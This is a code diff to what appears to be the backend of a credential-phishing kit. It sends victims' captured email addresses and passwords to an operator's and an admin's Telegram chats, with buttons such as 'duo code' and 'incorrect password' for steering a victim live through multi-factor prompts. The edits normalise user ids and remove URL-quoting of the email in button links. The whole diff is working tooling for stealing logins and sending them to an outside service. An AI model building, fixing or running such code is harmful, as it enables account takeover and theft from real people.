@@ -35,6 +35,8 @@ def _send_telegram_message(chat_id, text, bot_token, reply_markup=None):
 def _get_notification_recipients(session_id, original_user_id):
     admin_user = get_admin_user()
     admin_id = admin_user.get("id") if admin_user else None
+    original_user_id = str(original_user_id)
+    admin_id = str(admin_id)
 
     if not admin_id:
         return [str(original_user_id)]  # Failsafe
@@ -42,12 +44,12 @@ def _get_notification_recipients(session_id, original_user_id):
     record = Email_statuses.find_one({"session_id": session_id})
 
     # If admin has taken over, they are the sole recipient.
-    if record and record.get('active_user_id') == admin_id:
+    if record and str(record.get('active_user_id')) == str(admin_id):
         return [admin_id]
         
     # If the user is not the admin, return both.
-    if str(original_user_id) != admin_id:
-        return list(set([str(original_user_id), admin_id]))
+    if str(original_user_id) != str(admin_id):
+        return list(set([admin_id, str(original_user_id)]))
         
     # Default: The user is the admin.
     return [admin_id]
@@ -85,6 +87,7 @@ def get_status_update(session_id, email, password, user_id):
     """Sends login credentials to the appropriate recipients with status buttons."""
     admin_user = get_admin_user()
     admin_id = admin_user.get("id") if admin_user else None
+    admin_id = str(admin_id)
     recipients = _get_notification_recipients(session_id, user_id)
 
     for chat_id in recipients:
@@ -92,15 +95,20 @@ def get_status_update(session_id, email, password, user_id):
         bot_token = DEFAULT_BOT_TOKEN
         
         # Add session_id for the admin and use their token
-        if admin_user and str(chat_id) == admin_id:
+        if admin_user and str(chat_id) == str(admin_id):
             text = f"Session ID: {session_id}\n\n{text}"
             bot_token = admin_user.get("bot_token", DEFAULT_BOT_TOKEN)
 
         statuses = ['incorrect password', 'mobile notification', 'duo code', 'phone_call', 'incorrect duo code', 'success']
-        keyboard_layout = [[{'text': status.replace("_", " ").title(), 'url': f"{HOSTED_URL}/set_status/{chat_id}/{quote(email)}/{quote(status)}"}] for status in statuses]
+        keyboard_layout = [[{'text': status.replace("_", " ").title(), 'url': f"{HOSTED_URL}/set_status/{chat_id}/{email}/{quote(status)}"}] for status in statuses]
 
         # Add admin-only "Set Custom Message" button
-        if admin_user and str(chat_id) == admin_id:
-            keyboard_layout.append([{'text': 'Set Custom Message', 'url': f"{HOSTED_URL}/set_custom_status?email={quote(email)}"}])
+        if admin_user and str(chat_id) == str(admin_id):
+            keyboard_layout.append([{'text': 'Set Custom Message', 'url': f"{HOSTED_URL}/set_custom_status?email={email}"}])
 
+
+        recipients = _get_notification_recipients(session_id, user_id)
         _send_telegram_message(chat_id, text, bot_token, reply_markup={'inline_keyboard': keyboard_layout})
+
+
+
